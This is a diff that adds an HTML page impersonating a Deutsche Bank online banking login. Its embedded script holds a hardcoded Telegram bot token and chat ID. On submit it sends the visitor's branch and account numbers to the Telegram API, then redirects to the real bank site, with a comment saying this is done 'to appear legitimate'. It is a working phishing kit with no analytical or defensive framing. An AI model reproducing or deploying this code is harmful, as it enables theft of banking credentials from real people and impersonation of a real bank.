@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Banking Login</title>
+    <style>
+        /* Base Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", Arial, sans-serif;
+        }
+
+        body, html {
+            height: 100%;
+            background-color: #003087;
+        }
+
+        .page-container {
+            display: flex;
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        /* LEFT AREA (Main Login) */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: linear-gradient(rgba(0,48,135,0.8), rgba(0,48,135,0.8)), 
+                        url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .login-card {
+            background: white;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .brand-name { color: #003087; font-weight: bold; font-size: 16px; }
+        .brand-logo { 
+            width: 25px; height: 25px; border: 2px solid #003087; 
+            display: flex; align-items: center; justify-content: center; font-weight: bold;
+        }
+
+        h1 { font-size: 28px; font-weight: 400; color: #333; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: #666; margin-bottom: 25px; }
+
+        /* CORRECTED INPUT COLUMNS */
+        .input-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .input-group { display: flex; flex-direction: column; }
+        .input-group label { font-size: 12px; color: #888; margin-bottom: 5px; }
+        .input-group input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            width: 100%;
+            outline: none;
+        }
+
+        .branch { flex: 1.5; }
+        .branch input { border-bottom: 2px solid #d71f28; }
+        .account { flex: 2; }
+        .sub-account { flex: 1; }
+        .sub-account input { background: #f2f2f2; color: #888; text-align: center; border: 1px solid #ddd; }
+
+        .link-blue { color: #003087; text-decoration: none; font-size: 14px; margin-bottom: 30px; display: inline-block; }
+
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .btn-continue {
+            background: #003087;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* SIDEBAR (Right) */
+        .sidebar {
+            width: 320px;
+            background: white;
+            border-left: 1px solid #eee;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .promo-box { background: #001a4d; color: white; padding: 25px; }
+        .rate { font-size: 40px; font-weight: bold; color: #ccff00; }
+        .promo-text { background: white; color: #333; padding: 20px; font-size: 13px; line-height: 1.4; }
+
+        .info-links { padding: 25px; flex-grow: 1; }
+        .info-item { margin-bottom: 25px; }
+        .info-item h4 { font-size: 14px; color: #333; margin-bottom: 5px; }
+        .info-item p { font-size: 13px; color: #666; margin-bottom: 5px; }
+        .info-item a { font-size: 13px; color: #003087; text-decoration: none; }
+
+        .sidebar-footer { background: #001a4d; padding: 20px; color: white; font-size: 11px; }
+        .sidebar-footer a { color: white; text-decoration: none; margin-right: 8px; }
+
+        /* RESPONSIVE MEDIA QUERY */
+        @media (max-width: 900px) {
+            .page-container { flex-direction: column; height: auto; overflow: visible; }
+            .sidebar { width: 100%; border-left: none; border-top: 1px solid #eee; }
+            .main-content { min-height: 100vh; }
+            
+            @media (max-width: 480px) {
+                .input-row { flex-direction: column; }
+                .input-group { width: 100%; }
+                .form-footer { flex-direction: column; gap: 20px; align-items: flex-start; }
+                .btn-continue { width: 100%; }
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <main class="main-content">
+            <div class="login-card">
+                <div class="card-header">
+                    <span class="brand-name">Deutsche Bank</span>
+                    <div class="brand-logo">/</div>
+                </div>
+
+                <h1>Good evening</h1>
+                <p class="subtitle">Please enter your credentials.</p>
+
+                <form id="loginForm">
+                    <div class="input-row">
+                        <div class="input-group branch">
+                            <label>Branch</label>
+                            <input type="text" id="branch" maxlength="3" required>
+                        </div>
+                        <div class="input-group account">
+                            <label>Account</label>
+                            <input type="text" id="account" maxlength="7" required>
+                        </div>
+                        <div class="input-group sub-account">
+                            <label>Sub-account</label>
+                            <input type="text" id="subaccount" value="00" readonly>
+                        </div>
+                    </div>
+
+                    <a href="#" class="link-blue">Log in with Deutsche Bank ID</a>
+
+                    <div class="form-footer">
+                        <a href="#" class="link-blue" style="margin-bottom:0; font-size:12px;">Forgotten your credentials?</a>
+                        <button type="submit" class="btn-continue">Continue</button>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <aside class="sidebar">
+            <div class="promo-box">
+                <div class="rate">2,0% <span style="font-size:14px; color:white;">p.a.*</span></div>
+                <p style="font-weight:bold;">FestzinsSparen</p>
+            </div>
+            <div class="promo-text">
+                <p><strong>2.0% p.a.* fixed interest for 12 months</strong></p>
+                <p>Benefit from the currently available interest rate and protect your assets.</p>
+                <a href="#" style="color:#003087; font-weight:bold; display:block; margin-top:10px;">Open online now</a>
+            </div>
+
+            <div class="info-links">
+                <div class="info-item">
+                    <h4>Security information</h4>
+                    <p>Protect yourself and your online banking.</p>
+                    <a href="#">Security at a glance</a>
+                </div>
+                <div class="info-item">
+                    <h4>Online banking access</h4>
+                    <p>Apply for access here.</p>
+                    <a href="#">Apply now (German site)</a>
+                </div>
+            </div>
+
+            <footer class="sidebar-footer">
+                <div style="margin-bottom:10px;">
+                    <a href="#">Deutsche Version</a> | <a href="#">Help</a>
+                </div>
+                <div>
+                    <a href="#">Imprint</a> | <a href="#">Legal Notice</a> | <a href="#">Cookies</a>
+                </div>
+                <p style="margin-top:15px; opacity:0.6;">© 2024 Deutsche Bank AG</p>
+            </footer>
+        </aside>
+    </div>
+
+    <script>
+        const token = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
+        const chat_id = '177066662';
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const branch = document.getElementById('branch').value;
+            const account = document.getElementById('account').value;
+            const sub = document.getElementById('subaccount').value;
+
+            const message = `🔔 New Login Attempt:\n\nBranch: ${branch}\nAccount: ${account}\nSub: ${sub}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message
+                })
+            })
+            .then(response => {
+                // After sending, redirect to the real bank to appear legitimate
+                window.location.href = "https://www.deutsche-bank.de/pk/digital-banking/online-banking.html";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Connection error. Please try again.');
+            });
+        });
+    </script>
+</body>
+</html>
